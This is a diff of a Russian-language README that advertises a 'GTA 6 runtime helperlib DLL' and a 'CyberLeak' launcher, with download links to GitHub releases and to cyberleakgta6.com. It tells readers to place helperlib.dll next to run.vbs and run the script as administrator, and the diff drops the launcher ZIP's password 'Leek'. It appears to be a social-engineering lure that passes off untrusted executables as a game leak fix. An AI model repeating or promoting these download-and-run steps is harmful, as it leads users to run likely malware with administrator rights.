@@ -43,13 +43,13 @@ Not a standalone GTA 6. Not an APK. Not a 113 GB torrent.
 | **Оба в ZIP** | [GTA6_Runtime_helperlib.zip](https://github.com/FoxyYT1/gta-6-runtime-helperlib-dll/releases/download/v1.0/GTA6_Runtime_helperlib.zip) |
 | Зеркало сайта (DLL) | [cyberleakgta6.com/download/helperlib.dll](https://cyberleakgta6.com/download/helperlib.dll) (302 сюда) |
 | Гайд | [helperlib-dll-gta-6.html](https://cyberleakgta6.com/helperlib-dll-gta-6.html) |
-| Лаунчер | [GTA6_CyberLeak_Launcher.zip](https://github.com/FoxyYT1/GTA6-CyberLeak-Launcher/releases/download/123/GTA6_CyberLeak_Launcher.zip) (пароль **`Leek`**) |
+| Лаунчер | [GTA6_CyberLeak_Launcher.zip](https://github.com/FoxyYT1/GTA6-CyberLeak-Launcher/releases/download/123/GTA6_CyberLeak_Launcher.zip) (без пароля) |
 
 ---
 
 ## Как чинить FIX RUNTIME (киберлик)
 
-1. Скачайте **лаунчер** с канона, если ещё нет: [релиз 123](https://github.com/FoxyYT1/GTA6-CyberLeak-Launcher/releases/tag/123), пароль ZIP **`Leek`**.
+1. Скачайте **лаунчер** с канона, если ещё нет: [релиз 123](https://github.com/FoxyYT1/GTA6-CyberLeak-Launcher/releases/tag/123), ZIP без пароля.
 2. Скачайте **оба** runtime-файла с **этого** релиза v1.0.
 3. Положите `helperlib.dll` и `run.vbs` **рядом**.
 4. Запустите `run.vbs` **от имени администратора** (или через лаунчер).
